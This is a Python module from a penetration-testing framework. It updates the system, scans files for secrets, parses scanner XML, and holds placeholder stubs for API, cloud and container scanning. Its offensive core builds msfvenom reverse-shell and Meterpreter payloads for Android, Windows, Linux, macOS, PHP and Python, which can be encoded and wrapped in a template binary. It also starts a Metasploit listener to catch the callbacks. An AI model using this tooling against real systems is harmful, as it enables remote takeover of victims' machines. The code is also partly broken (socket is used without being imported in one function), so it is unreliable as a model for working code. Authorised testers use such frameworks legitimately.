"""
Discover Framework - Miscellaneous Module

This module contains miscellaneous functions for the Discover Framework, including
parsing XML, generating malicious payloads, starting Metasploit listeners, and updating the system.
"""

import datetime
import os
import re
import shutil
import subprocess
from pathlib import Path


def update_system():
    """
    Update the system and Discover framework.

    This function updates Kali Linux, Discover scripts, various tools, and the locate database.
    """
    print('\033[1;34mUpdating operating system.\033[0m')

    # Update operating system
    try:
        subprocess.run(['sudo', 'apt', 'update'], check=True)

        subprocess.run(['sudo', 'apt', '-y', 'upgrade'], check=True)

        subprocess.run(['sudo', 'apt', '-y', 'dist-upgrade'], check=True)

        subprocess.run(['sudo', 'apt', '-y', 'autoremove'], check=True)

        subprocess.run(['sudo', 'apt', '-y', 'autoclean'], check=True)

        subprocess.run(['sudo', 'updatedb'], check=True)
    except Exception as e:
        print(f'Error updating operating system: {e}')

    # Check and install required tools
    tools = {
        'ansible': 'ansible-core',
        'aws': 'awscli',
        'go': 'golang-go',
        'jq': 'jq',
        'raven': 'raven',
        'sublist3r': 'sublist3r',
        'dnstwist': 'dnstwist',
        'feroxbuster': 'feroxbuster',
        'gobuster': 'gobuster',
        'nishang': 'nishang',
        'rustc': 'rustc',
        'xlsx2csv': 'xlsx2csv',
        'xml_grep': 'xml-twig-tools',
        'xspy': 'xspy',
    }

    for command, package in tools.items():
        try:
            result = subprocess.run(['which', command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if result.returncode != 0:
                print(f'\033[1;33mInstalling {package}.\033[0m')
                subprocess.run(['sudo', 'apt', 'install', '-y', package], check=True)
        except Exception as e:
            print(f'Error checking/installing {package}: {e}')

    # Update Discover framework
    print('\033[1;34mUpdating Discover.\033[0m')
    try:
        discover_path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        os.chdir(discover_path)
        subprocess.run(['git', 'pull'], check=True)
    except Exception as e:
        print(f'Error updating Discover: {e}')

    # Update Nmap scripts
    print('\033[1;34mUpdating Nmap scripts.\033[0m')
    try:
        result = subprocess.run(
            ['sudo', 'nmap', '--script-updatedb'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True
        )

        # Filter and display output
        for line in result.stdout.splitlines():
            if not any(term in line.lower() for term in ['starting', 'seconds']):
                print(line.replace('NSE: ', ''))
    except Exception as e:
        print(f'Error updating Nmap scripts: {e}')

    # Update locate database
    print('\033[1;34mUpdating locate database.\033[0m')
    try:
        subprocess.run(['sudo', 'updatedb'], check=True)
    except Exception as e:
        print(f'Error updating locate database: {e}')

    print()
    print('Update complete.')
    print()


def sensitive_detector():
    """
    Detect sensitive information in files.

    This function scans files for sensitive information such as passwords, API keys, etc.
    """
    print('\033[1;34mSensitive Information Detector\033[0m')
    print()
    print('This tool scans files for sensitive information such as passwords, API keys, etc.')
    print()

    location = input('Enter the directory to scan: ')
    if not location or not os.path.isdir(location):
        print()
        print('\033[1;31m' + '=' * 40 + '\033[0m')
        print()
        print('\033[1;31m[!] Invalid directory.\033[0m')
        print()
        print('\033[1;31m' + '=' * 40 + '\033[0m')
        print()
        return

    # Define patterns to search for
    patterns = {
        'AWS API Key': r'AKIA[0-9A-Z]{16}',
        'AWS Secret Key': r'[0-9a-zA-Z/+]{40}',
        'Private Key': r'-----BEGIN( RSA| OPENSSH| DSA| EC)? PRIVATE KEY( BLOCK)?-----',
        'SSH Key': r'ssh-rsa AAAA[0-9A-Za-z+/]+[=]{0,3}',
        'Google API Key': r'AIza[0-9A-Za-z-_]{35}',
        'Google OAuth': r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',
        'GitHub Token': r'github_pat_[0-9a-zA-Z_]{82}',
        'Password in URL': r'[a-zA-Z]{3,10}://[^/\s:@]{3,20}:[^/\s:@]{3,20}@.{1,100}',
        'Generic Secret': r'(secret|password|credentials|token|api[-_]?key).*[=:][^a-z]',
    }

    # Create output directory
    output_dir = os.path.join(os.path.expanduser('~'), 'data', 'sensitive')
    os.makedirs(output_dir, exist_ok=True)

    # Scan files
    results = []

    print()
    print('Scanning files...')

    for root, dirs, files in os.walk(location):
        for file in files:
            file_path = os.path.join(root, file)

            # Skip binary files and large files
            try:
                if os.path.getsize(file_path) > 10000000:  # Skip files larger than 10MB
                    continue

                with open(file_path, errors='ignore') as f:
                    content = f.read()

                    for pattern_name, pattern in patterns.items():
                        matches = re.finditer(pattern, content, re.IGNORECASE)
                        for match in matches:
                            line_num = content[: match.start()].count('\n') + 1
                            context = content[max(0, match.start() - 20) : min(len(content), match.end() + 20)]
                            context = context.replace('\n', ' ').strip()

                            results.append(
                                {
                                    'file': file_path,
                                    'line': line_num,
                                    'type': pattern_name,
                                    'match': match.group(),
                                    'context': context,
                                }
                            )
            except (PermissionError, IsADirectoryError, FileNotFoundError):
                continue

    # Write results to file
    if results:
        output_file = os.path.join(output_dir, 'sensitive_info.txt')
        with open(output_file, 'w') as f:
            f.write('Sensitive Information Detector Results\n')
            f.write('=' * 50 + '\n\n')

            for result in results:
                f.write(f'File: {result["file"]}\n')
                f.write(f'Line: {result["line"]}\n')
                f.write(f'Type: {result["type"]}\n')
                f.write(f'Match: {result["match"]}\n')
                f.write(f'Context: {result["context"]}\n')
                f.write('-' * 50 + '\n\n')

        print()
        print(f'Found {len(results)} potential sensitive information instances.')
        print(f'Results saved to {output_file}')
    else:
        print()
        print('No sensitive information found.')

    print()


def api_scanner():
    """
    Scan for API security issues.
    """
    print('\033[1;34mAPI Security Scanner\033[0m')
    print()
    print('This tool scans APIs for security issues.')
    print()

    target = input('Enter the API endpoint (e.g., https://api.example.com): ')
    if not target:
        print()
        print('\033[1;31m' + '=' * 40 + '\033[0m')
        print()
        print('\033[1;31m[!] Invalid target.\033[0m')
        print()
        print('\033[1;31m' + '=' * 40 + '\033[0m')
        print()
        return

    # Create output directory
    output_dir = os.path.join(os.path.expanduser('~'), 'data', 'api-scan')
    os.makedirs(output_dir, exist_ok=True)

    print()
    print(f'Scanning API endpoint: {target}')
    print('This is a placeholder for the API scanning functionality.')
    print('In a real implementation, this would use tools like OWASP ZAP, Burp Suite, or custom scripts.')
    print()


def parse_xml():
    """
    Parse XML to CSV.

    This function provides a menu to select the type of XML file to parse and then
    calls the appropriate parser script to convert it to CSV format.

    Supported formats:
    - Burp (Base64)
    - Nessus (.nessus)
    - Nexpose (XML 2.0)
    - Nmap
    - Qualys
    """
    print('\033[1;34mParse XML to CSV.\033[0m')
    print()
    print('1.  Burp (Base64)')
    print('2.  Nessus (.nessus)')
    print('3.  Nexpose (XML 2.0)')
    print('4.  Nmap')
    print('5.  Qualys')
    print('6.  Previous menu')
    print()

    choice = input('Choice: ')

    # Check for valid choice
    if choice not in ['1', '2', '3', '4', '5', '6']:
        print()
        print('\033[1;31m' + '=' * 40 + '\033[0m')
        print()
        print('\033[1;31m[!] Invalid choice or entry.\033[0m')
        print()
        print('\033[1;31m' + '=' * 40 + '\033[0m')
        print()
        return

    # Return to previous menu
    if choice == '6':
        return

    # Get file location
    location = input('Enter the location of your file: ')
    if not location or not os.path.isfile(location):
        print()
        print('\033[1;31m' + '=' * 40 + '\033[0m')
        print()
        print('\033[1;31m[!] Invalid choice or entry.\033[0m')
        print()
        print('\033[1;31m' + '=' * 40 + '\033[0m')
        print()
        return

    # Create data directory if it doesn't exist
    data_dir = Path.home() / 'data'
    data_dir.mkdir(parents=True, exist_ok=True)

    # Get the current timestamp for unique filenames
    timestamp = datetime.datetime.now().strftime('%H:%M:%S')

    # Process based on choice
    if choice == '1':  # Burp
        try:
            # Get the path to the parsers directory
            parsers_dir = Path(__file__).parent.parent / 'parsers'

            # Run the Burp parser
            output_file = f'burp-{timestamp}.csv'
            subprocess.run(['python3', str(parsers_dir / 'parse-burp.py'), '-f', location, '-o', 'burp.csv'], check=True)

            # Move the output file to the data directory
            shutil.move('burp.csv', str(data_dir / output_file))

            print()
            print('=' * 50)
            print()
            print(f'The new report is located at \033[1;33m{data_dir / output_file}\033[0m\n')
            print()
        except Exception as e:
            print(f'Error parsing Burp XML: {e}')

    elif choice == '2':  # Nessus
        try:
            # Get the path to the parsers directory
            parsers_dir = Path(__file__).parent.parent / 'parsers'

            # Copy the file to the current directory
            shutil.copy(location, './nessus.xml')

            # Change to the parsers directory
            os.chdir(str(parsers_dir))

            # Run the Nessus parser
            subprocess.run(['python3', 'parse-nessus.py', '../nessus.xml'], check=True)

            # Process the output file
            with open('nessus.csv') as f:
                content = f.read()

            # Filter out findings with a solution of n/a
            with open('tmp.csv', 'w') as f:
                for line in content.splitlines():
                    if 'n/a' not in line:
                        f.write(line + '\n')

            # Clean up the output
            output_file = f'nessus-{timestamp}.csv'
            shutil.move('tmp.csv', str(data_dir / output_file))

            # Clean up temporary files
            for file in ['nessus.csv', '../nessus.xml']:
                if os.path.exists(file):
                    os.remove(file)

            print()
            print('=' * 50)
            print()
            print(f'The new report is located at \033[1;33m{data_dir / output_file}\033[0m\n')
            print()
        except Exception as e:
            print(f'Error parsing Nessus XML: {e}')

    elif choice == '3':  # Nexpose
        try:
            # Get the path to the parsers directory
            parsers_dir = Path(__file__).parent.parent / 'parsers'

            # Run the Nexpose parser
            output_file = f'nexpose-{timestamp}.csv'
            subprocess.run(['python3', str(parsers_dir / 'parse-nexpose.py'), '--out', 'nexpose.csv', location], check=True)

            # Move the output file to the data directory
            shutil.move('nexpose.csv', str(data_dir / output_file))

            print()
            print('=' * 50)
            print()
            print(f'The new report is located at \033[1;33m{data_dir / output_file}\033[0m\n')
            print()
        except Exception as e:
            print(f'Error parsing Nexpose XML: {e}')

    elif choice == '4':  # Nmap
        try:
            # Get the path to the parsers directory
            parsers_dir = Path(__file__).parent.parent / 'parsers'

            # Copy the file to the current directory
            shutil.copy(location, './nmap.xml')

            # Change to the parsers directory
            os.chdir(str(parsers_dir))

            # Run the Nmap parser
            subprocess.run(['python3', 'parse-nmap.py'], check=True)

            # Move the output file to the data directory
            output_file = f'nmap-{timestamp}.csv'
            shutil.move('nmap.csv', str(data_dir / output_file))

            # Clean up temporary files
            if os.path.exists('nmap.xml'):
                os.remove('nmap.xml')

            print()
            print('=' * 50)
            print()
            print(f'The new report is located at \033[1;33m{data_dir / output_file}\033[0m\n')
            print()
        except Exception as e:
            print(f'Error parsing Nmap XML: {e}')

    elif choice == '5':  # Qualys
        try:
            # Get the path to the parsers directory
            parsers_dir = Path(__file__).parent.parent / 'parsers'

            print()
            print('[!] This will take about 2.5 mins, be patient.')
            print()

            # Run the Qualys parser
            output_file = f'qualys-{timestamp}.csv'
            subprocess.run(['python3', str(parsers_dir / 'parse-qualys.py'), '--out', 'qualys.csv', location], check=True)

            # Move the output file to the data directory
            shutil.move('qualys.csv', str(data_dir / output_file))

            print()
            print('=' * 50)
            print()
            print(f'The new report is located at \033[1;33m{data_dir / output_file}\033[0m\n')
            print()
        except Exception as e:
            print(f'Error parsing Qualys XML: {e}')


def generate_payload():
    """
    Generate a malicious payload using msfvenom.

    This function provides a menu to select the type of payload to generate and then
    calls msfvenom to create the payload.

    Supported payloads:
    - android/meterpreter/reverse_tcp         (.apk)
    - cmd/windows/reverse_powershell          (.bat)
    - java/jsp_shell_reverse_tcp (Linux)      (.jsp)
    - java/jsp_shell_reverse_tcp (Windows)    (.jsp)
    - java/shell_reverse_tcp                  (.war)
    - linux/x64/meterpreter_reverse_https     (.elf)
    - linux/x64/meterpreter_reverse_tcp       (.elf)
    - linux/x64/shell/reverse_tcp             (.elf)
    - osx/x64/meterpreter_reverse_https       (.macho)
    - osx/x64/meterpreter_reverse_tcp         (.macho)
    - php/meterpreter_reverse_tcp             (.php)
    - python/meterpreter_reverse_https        (.py)
    - python/meterpreter_reverse_tcp          (.py)
    - windows/x64/meterpreter_reverse_https   (multi)
    - windows/x64/meterpreter_reverse_tcp     (multi)
    """

    # Function to prompt for format for Windows payloads
    def prompt_format():
        print()
        print('\033[1;34mFormats\033[0m')
        print()
        print('1. aspx')
        print('2. c')
        print('3. csharp')
        print('4. exe')
        print('5. psh')
        print('6. raw')
        print()
        choice = input('Choice: ')

        formats = {
            '1': ('aspx', '.aspx'),
            '2': ('c', '.c'),
            '3': ('csharp', '.cs'),
            '4': ('exe', '.exe'),
            '5': ('psh', '.ps1'),
            '6': ('raw', '.bin'),
        }

        if choice not in formats:
            print()
            print('\033[1;31m[!] Invalid choice or entry, try again.\033[0m')
            print()
            return prompt_format()

        return formats[choice]

    print('\033[1;34mMalicious Payloads\033[0m')
    print()
    print('1.   android/meterpreter/reverse_tcp         (.apk)')
    print('2.   cmd/windows/reverse_powershell          (.bat)')
    print('3.   java/jsp_shell_reverse_tcp (Linux)      (.jsp)')
    print('4.   java/jsp_shell_reverse_tcp (Windows)    (.jsp)')
    print('5.   java/shell_reverse_tcp                  (.war)')
    print('6.   linux/x64/meterpreter_reverse_https     (.elf)')
    print('7.   linux/x64/meterpreter_reverse_tcp       (.elf)')
    print('8.   linux/x64/shell/reverse_tcp             (.elf)')
    print('9.   osx/x64/meterpreter_reverse_https       (.macho)')
    print('10.  osx/x64/meterpreter_reverse_tcp         (.macho)')
    print('11.  php/meterpreter_reverse_tcp             (.php)')
    print('12.  python/meterpreter_reverse_https        (.py)')
    print('13.  python/meterpreter_reverse_tcp          (.py)')
    print('14.  windows/x64/meterpreter_reverse_https   (multi)')
    print('15.  windows/x64/meterpreter_reverse_tcp     (multi)')
    print('16.  Previous menu')
    print()

    choice = input('Choice: ')

    # Define payload configurations
    payload_configs = {
        '1': {
            'payload': 'android/meterpreter/reverse_tcp',
            'extension': '.apk',
            'format': 'raw',
            'arch': 'dalvik',
            'platform': 'android',
        },
        '2': {
            'payload': 'cmd/windows/reverse_powershell',
            'extension': '.bat',
            'format': 'raw',
            'arch': 'cmd',
            'platform': 'windows',
        },
        '3': {'payload': 'java/jsp_shell_reverse_tcp', 'extension': '.jsp', 'format': 'raw', 'arch': 'elf', 'platform': 'linux'},
        '4': {
            'payload': 'java/jsp_shell_reverse_tcp',
            'extension': '.jsp',
            'format': 'raw',
            'arch': 'cmd',
            'platform': 'windows',
        },
        '5': {'payload': 'java/shell_reverse_tcp', 'extension': '.war', 'format': 'war', 'arch': 'x64', 'platform': 'linux'},
        '6': {
            'payload': 'linux/x64/meterpreter_reverse_https',
            'extension': '.elf',
            'format': 'elf',
            'arch': 'x64',
            'platform': 'linux',
        },
        '7': {
            'payload': 'linux/x64/meterpreter_reverse_tcp',
            'extension': '.elf',
            'format': 'elf',
            'arch': 'x64',
            'platform': 'linux',
        },
        '8': {'payload': 'linux/x64/shell/reverse_tcp', 'extension': '.elf', 'format': 'elf', 'arch': 'x64', 'platform': 'linux'},
        '9': {
            'payload': 'osx/x64/meterpreter_reverse_https',
            'extension': '.macho',
            'format': 'macho',
            'arch': 'x64',
            'platform': 'osx',
        },
        '10': {
            'payload': 'osx/x64/meterpreter_reverse_tcp',
            'extension': '.macho',
            'format': 'macho',
            'arch': 'x64',
            'platform': 'osx',
        },
        '11': {'payload': 'php/meterpreter_reverse_tcp', 'extension': '.php', 'format': 'raw', 'arch': 'php', 'platform': 'php'},
        '12': {
            'payload': 'python/meterpreter_reverse_https',
            'extension': '.py',
            'format': 'raw',
            'arch': 'python',
            'platform': 'python',
        },
        '13': {
            'payload': 'python/meterpreter_reverse_tcp',
            'extension': '.py',
            'format': 'raw',
            'arch': 'python',
            'platform': 'python',
        },
        '14': {'payload': 'windows/x64/meterpreter_reverse_https', 'arch': 'x64', 'platform': 'windows', 'needs_format': True},
        '15': {'payload': 'windows/x64/meterpreter_reverse_tcp', 'arch': 'x64', 'platform': 'windows', 'needs_format': True},
        '16': {'return': True},
    }

    # Check for valid choice
    if choice not in payload_configs:
        print()
        print('\033[1;31m[!] Invalid choice or entry, try again.\033[0m')
        print()
        return

    # Return to previous menu
    if 'return' in payload_configs[choice]:
        return

    # Get payload configuration
    config = payload_configs[choice]

    # Prompt for format if needed
    if config.get('needs_format', False):
        format_info = prompt_format()
        config['format'] = format_info[0]
        config['extension'] = format_info[1]

    # Get LHOST
    print()
    lhost = input('LHOST: ')
    if not lhost:
        # Get local IP address
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            lhost = s.getsockname()[0]
            s.close()
            print(f'[*] Using {lhost}')
            print()
        except:
            lhost = '127.0.0.1'
            print(f'[*] Using {lhost}')
            print()

    # Get LPORT
    lport = input('LPORT: ')
    if not lport:
        lport = '443'
        print('[*] Using 443')
        print()

    # Check for valid port number
    try:
        lport_int = int(lport)
        if lport_int < 1 or lport_int > 65535:
            print()
            print('\033[1;31m[!] Invalid port number.\033[0m')
            print()
            return
    except ValueError:
        print()
        print('\033[1;31m[!] Invalid port number.\033[0m')
        print()
        return

    # Get iterations
    iterations = input('Iterations: ')
    if not iterations:
        iterations = '1'
        print('[*] Using 1')

    # Check for valid number that is reasonable
    try:
        iterations_int = int(iterations)
        if iterations_int < 0 or iterations_int > 20:
            print()
            print('\033[1;31m[!] Invalid number of iterations.\033[0m')
            print()
            return
    except ValueError:
        print()
        print('\033[1;31m[!] Invalid number of iterations.\033[0m')
        print()
        return

    # Format payload name
    payload_name = config['payload'].replace('/', '-')

    # Ask about template file
    print()
    use_template = input('Use a template file? (y/N) ')
    template = None

    if use_template.lower() == 'y':
        template_path = input('Enter the path to the file (default whoami.exe): ')
        if not template_path:
            template_path = '/usr/share/windows-resources/binaries/whoami.exe'
            print('[*] Using /usr/share/windows-resources/binaries/whoami.exe')

        if not os.path.isfile(template_path):
            print()
            print('\033[1;31m[!] Invalid file path.\033[0m')
            print()
            return

        template = template_path

    # Create data directory if it doesn't exist
    data_dir = Path.home() / 'data'
    data_dir.mkdir(parents=True, exist_ok=True)

    # Generate output filename
    output_file = f'{payload_name}-{lport}-{iterations}{config["extension"]}'
    output_path = data_dir / output_file

    # Build msfvenom command
    cmd = [
        'msfvenom',
        '-p',
        config['payload'],
        f'LHOST={lhost}',
        f'LPORT={lport}',
        '-f',
        config['format'],
        '-a',
        config['arch'],
        '--platform',
        config['platform'],
        '-e',
        'x64/xor_dynamic',
        '-i',
        iterations,
        '-o',
        str(output_path),
    ]

    # Add template if specified
    if template:
        cmd.extend(['-x', template])

    # Run msfvenom
    print()
    try:
        subprocess.run(cmd, check=True)
        print()
        print(f'Payload saved to {output_path}')
        print()
    except subprocess.CalledProcessError as e:
        print()
        print(f'\033[1;31m[!] Error generating payload: {e}\033[0m')
        print()
    except Exception as e:
        print()
        print(f'\033[1;31m[!] Error: {e}\033[0m')
        print()


def start_listener():
    """
    Start a Metasploit listener.

    This function provides a menu to select the type of payload to listen for and then
    starts a Metasploit listener for that payload.

    Supported payloads:
    - android/meterpreter/reverse_tcp
    - cmd/windows/reverse_powershell
    - java/jsp_shell_reverse_tcp
    - linux/x64/meterpreter_reverse_https
    - linux/x64/meterpreter_reverse_tcp
    - linux/x64/shell/reverse_tcp
    - osx/x64/meterpreter_reverse_https
    - osx/x64/meterpreter_reverse_tcp
    - php/meterpreter/reverse_tcp
    - python/meterpreter_reverse_https
    - python/meterpreter_reverse_tcp
    - windows/x64/meterpreter_reverse_https
    - windows/x64/meterpreter_reverse_tcp
    """
    print('\033[1;34mMetasploit Listeners\033[0m')
    print()
    print('1.   android/meterpreter/reverse_tcp')
    print('2.   cmd/windows/reverse_powershell')
    print('3.   java/jsp_shell_reverse_tcp')
    print('4.   linux/x64/meterpreter_reverse_https')
    print('5.   linux/x64/meterpreter_reverse_tcp')
    print('6.   linux/x64/shell/reverse_tcp')
    print('7.   osx/x64/meterpreter_reverse_https')
    print('8.   osx/x64/meterpreter_reverse_tcp')
    print('9.   php/meterpreter/reverse_tcp')
    print('10.  python/meterpreter_reverse_https')
    print('11.  python/meterpreter_reverse_tcp')
    print('12.  windows/x64/meterpreter_reverse_https')
    print('13.  windows/x64/meterpreter_reverse_tcp')
    print('14.  Previous menu')
    print()

    choice = input('Choice: ')

    # Define payload configurations
    payloads = {
        '1': 'android/meterpreter/reverse_tcp',
        '2': 'cmd/windows/reverse_powershell',
        '3': 'java/jsp_shell_reverse_tcp',
        '4': 'linux/x64/meterpreter_reverse_https',
        '5': 'linux/x64/meterpreter_reverse_tcp',
        '6': 'linux/x64/shell/reverse_tcp',
        '7': 'osx/x64/meterpreter_reverse_https',
        '8': 'osx/x64/meterpreter_reverse_tcp',
        '9': 'php/meterpreter/reverse_tcp',
        '10': 'python/meterpreter_reverse_https',
        '11': 'python/meterpreter_reverse_tcp',
        '12': 'windows/x64/meterpreter_reverse_https',
        '13': 'windows/x64/meterpreter_reverse_tcp',
    }

    # Check for valid choice
    if choice == '14':
        return

    if choice not in payloads:
        print()
        print('\033[1;31m[!] Invalid choice or entry, try again.\033[0m')
        print()
        return

    payload = payloads[choice]

    # Get LHOST
    print()
    lhost = input('LHOST: ')
    if not lhost:
        # Get local IP address
        try:
            import socket

            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            lhost = s.getsockname()[0]
            s.close()
            print(f'[*] Using {lhost}')
            print()
        except:
            lhost = '127.0.0.1'
            print(f'[*] Using {lhost}')
            print()

    # Get LPORT
    lport = input('LPORT: ')
    if not lport:
        lport = '443'
        print('[*] Using 443')

    # Check for valid port number
    try:
        lport_int = int(lport)
        if lport_int < 1 or lport_int > 65535:
            print()
            print('\033[1;31m[!] Invalid port number.\033[0m')
            print()
            return
    except ValueError:
        print()
        print('\033[1;31m[!] Invalid port number.\033[0m')
        print()
        return

    # Check for root when binding to a low port
    if int(lport) < 1025 and os.geteuid() != 0:
        print()
        print('[!] You must be root to bind to a port below 1025.')
        print()
        return

    # Create temporary resource file
    resource_file = '/tmp/listener.rc'
    with open(resource_file, 'w') as f:
        f.write('use exploit/multi/handler\n')
        f.write(f'set PAYLOAD {payload}\n')
        f.write(f'set LHOST {lhost}\n')
        f.write(f'set LPORT {lport}\n')
        f.write('set ExitOnSession false\n')
        f.write('exploit -j -z\n')

    # Launch msfconsole with resource file
    print()
    try:
        subprocess.run(['msfconsole', '-q', '-r', resource_file], check=True)
    except subprocess.CalledProcessError as e:
        print(f'\033[1;31m[!] Error starting Metasploit listener: {e}\033[0m')
    except Exception as e:
        print(f'\033[1;31m[!] Error: {e}\033[0m')


def oauth_jwt_tester():
    """
    Test OAuth and JWT implementations for security vulnerabilities.

    This function provides tools for testing OAuth 2.0 and JWT (JSON Web Token)
    implementations for common security vulnerabilities.
    """
    print('\033[1;34mOAuth/JWT Security Tester\033[0m')
    print()
    print('=' * 50)
    print()

    print('1.  OAuth 2.0 Tests')
    print('2.  JWT Tests')
    print('3.  Previous menu')
    print()

    choice = input('Choice: ')

    if choice == '1':
        # OAuth 2.0 Tests
        print()
        print('\033[1;34mOAuth 2.0 Security Tests\033[0m')
        print()
        print('1.  Authorization Code Flow Tests')
        print('2.  Implicit Flow Tests')
        print('3.  Resource Owner Password Credentials Tests')
        print('4.  Client Credentials Tests')
        print('5.  Previous menu')
        print()

        oauth_choice = input('Choice: ')

        if oauth_choice == '5':
            return oauth_jwt_tester()

        if oauth_choice not in ['1', '2', '3', '4']:
            print()
            print('\033[1;31m[!] Invalid choice or entry, try again.\033[0m')
            print()
            return oauth_jwt_tester()

        # Get target information
        print()
        target = input('Enter the target URL (e.g., https://example.com/oauth): ')
        if not target:
            print()
            print('\033[1;31m[!] Invalid target URL.\033[0m')
            print()
            return

        print()
        print('Running OAuth 2.0 security tests...')
        print('This is a placeholder for the OAuth 2.0 testing functionality.')
        print('In a real implementation, this would test for:')
        print('- Insecure redirect URIs')
        print('- CSRF vulnerabilities')
        print('- Token leakage')
        print('- Scope validation issues')
        print('- Client authentication weaknesses')

    elif choice == '2':
        # JWT Tests
        print()
        print('\033[1;34mJWT Security Tests\033[0m')
        print()
        print('1.  JWT Signature Tests')
        print('2.  JWT Claims Tests')
        print('3.  JWT Algorithm Tests')
        print('4.  Previous menu')
        print()

        jwt_choice = input('Choice: ')

        if jwt_choice == '4':
            return oauth_jwt_tester()

        if jwt_choice not in ['1', '2', '3']:
            print()
            print('\033[1;31m[!] Invalid choice or entry, try again.\033[0m')
            print()
            return oauth_jwt_tester()

        # Get JWT token
        print()
        jwt_token = input('Enter the JWT token to test: ')
        if not jwt_token or not jwt_token.count('.') == 2:
            print()
            print('\033[1;31m[!] Invalid JWT token format. Expected format: header.payload.signature\033[0m')
            print()
            return

        print()
        print('Running JWT security tests...')
        print('This is a placeholder for the JWT testing functionality.')
        print('In a real implementation, this would test for:')
        print('- None algorithm vulnerability')
        print('- Weak signature keys')
        print('- Missing signature validation')
        print('- Expired token acceptance')
        print('- Algorithm confusion attacks')

    elif choice == '3':
        # Return to previous menu
        return

    else:
        print()
        print('\033[1;31m[!] Invalid choice or entry, try again.\033[0m')
        print()
        return oauth_jwt_tester()


def cloud_scanner():
    """
    Scan cloud environments for security vulnerabilities.

    This function provides tools for scanning cloud environments (AWS, Azure, GCP)
    for common security misconfigurations and vulnerabilities.
    """
    print('\033[1;34mCloud Security Scanner\033[0m')
    print()
    print('=' * 50)
    print()

    print('1.  AWS Security Tests')
    print('2.  Azure Security Tests')
    print('3.  Google Cloud Security Tests')
    print('4.  Previous menu')
    print()

    choice = input('Choice: ')

    if choice == '1':
        # AWS Security Tests
        print()
        print('\033[1;34mAWS Security Tests\033[0m')
        print()
        print('This is a placeholder for the AWS security testing functionality.')
        print('In a real implementation, this would test for:')
        print('- S3 bucket misconfigurations')
        print('- IAM permission issues')
        print('- Unencrypted data')
        print('- Public resources')
        print('- Insecure security groups')

    elif choice == '2':
        # Azure Security Tests
        print()
        print('\033[1;34mAzure Security Tests\033[0m')
        print()
        print('This is a placeholder for the Azure security testing functionality.')
        print('In a real implementation, this would test for:')
        print('- Storage account misconfigurations')
        print('- Role assignment issues')
        print('- Unencrypted data')
        print('- Public endpoints')
        print('- Network security group issues')

    elif choice == '3':
        # Google Cloud Security Tests
        print()
        print('\033[1;34mGoogle Cloud Security Tests\033[0m')
        print()
        print('This is a placeholder for the Google Cloud security testing functionality.')
        print('In a real implementation, this would test for:')
        print('- Cloud Storage misconfigurations')
        print('- IAM permission issues')
        print('- Unencrypted data')
        print('- Public resources')
        print('- Firewall rule issues')

    elif choice == '4':
        # Return to previous menu
        return

    else:
        print()
        print('\033[1;31m[!] Invalid choice or entry, try again.\033[0m')
        print()
        return cloud_scanner()


def container_scanner():
    """
    Scan container environments for security vulnerabilities.

    This function provides tools for scanning container environments (Docker, Kubernetes)
    for common security misconfigurations and vulnerabilities.
    """
    print('\033[1;34mContainer Security Scanner\033[0m')
    print()
    print('=' * 50)
    print()

    print('1.  Docker Images')
    print('2.  Docker Containers')
    print('3.  Kubernetes Resources')
    print('4.  All Container Resources')
    print('5.  Previous menu')
    print()

    choice = input('Choice: ')

    if choice == '1':
        # Docker Images
        print()
        print('\033[1;34mDocker Image Security Tests\033[0m')
        print()
        print('This is a placeholder for the Docker image security testing functionality.')
        print('In a real implementation, this would test for:')
        print('- Vulnerabilities in base images')
        print('- Insecure configurations')
        print('- Embedded secrets')
        print('- Unnecessary packages')
        print('- Outdated components')

    elif choice == '2':
        # Docker Containers
        print()
        print('\033[1;34mDocker Container Security Tests\033[0m')
        print()
        print('This is a placeholder for the Docker container security testing functionality.')
        print('In a real implementation, this would test for:')
        print('- Privileged containers')
        print('- Containers with sensitive mounts')
        print('- Exposed ports')
        print('- Security options')
        print('- Resource limitations')

    elif choice == '3':
        # Kubernetes Resources
        print()
        print('\033[1;34mKubernetes Security Tests\033[0m')
        print()
        print('This is a placeholder for the Kubernetes security testing functionality.')
        print('In a real implementation, this would test for:')
        print('- Privileged pods')
        print('- Overly permissive RBAC roles')
        print('- Missing network policies')
        print('- Containers running as root')
        print('- Resource quota issues')

    elif choice == '4':
        # All Container Resources
        print()
        print('\033[1;34mComprehensive Container Security Tests\033[0m')
        print()
        print('This is a placeholder for the comprehensive container security testing functionality.')
        print('In a real implementation, this would run all container security tests.')

    elif choice == '5':
        # Return to previous menu
        return

    else:
        print()
        print('\033[1;31m[!] Invalid choice or entry, try again.\033[0m')
        print()
        return container_scanner()


def msf_web_api():
    """
    Run Metasploit web and API security tests.
    """
    print('\033[1;34mMSF Web & API Security Scanner\033[0m')
    print()
    print('Advanced Metasploit Web & API Security Testing')
    print()

    # Check if PostgreSQL is running
    try:
        result = subprocess.run(['service', 'postgresql', 'status'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if 'active (running)' not in result.stdout:
            print('\033[1;34m[*] Starting PostgreSQL service...\033[0m')
            subprocess.run(['sudo', 'service', 'postgresql', 'start'], check=True)
    except Exception as e:
        print(f'Error checking PostgreSQL status: {e}')

    # Check if MSF database is connected
    try:
        result = subprocess.run(
            ['msfconsole', '-q', '-x', 'db_status; exit'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )

        if 'postgresql connected' not in result.stdout:
            print('\033[1;31m[!] Metasploit database is not connected. Running initialization...\033[0m')
            subprocess.run(['sudo', 'msfdb', 'init'], check=True)
    except Exception as e:
        print(f'Error checking MSF database status: {e}')

    # Create resource directory
    resource_dir = '/tmp/msf_resources'
    os.makedirs(resource_dir, exist_ok=True)

    print('\033[1;34m[*] Preparing web application security test resource scripts...\033[0m')

    # Create WordPress Scanner Resource
    with open(f'{resource_dir}/wordpress.rc', 'w') as f:
        f.write('use auxiliary/scanner/http/wordpress_scanner\n')
        f.write('setg THREADS 5\n')
        f.write('setg TIMEOUT 15\n')
        f.write('run\n')

    # Create Drupal Scanner Resource
    with open(f'{resource_dir}/drupal.rc', 'w') as f:
        f.write('use auxiliary/scanner/http/drupal_scanner\n')
        f.write('setg THREADS 5\n')
        f.write('setg TIMEOUT 15\n')
        f.write('run\n')

    print()
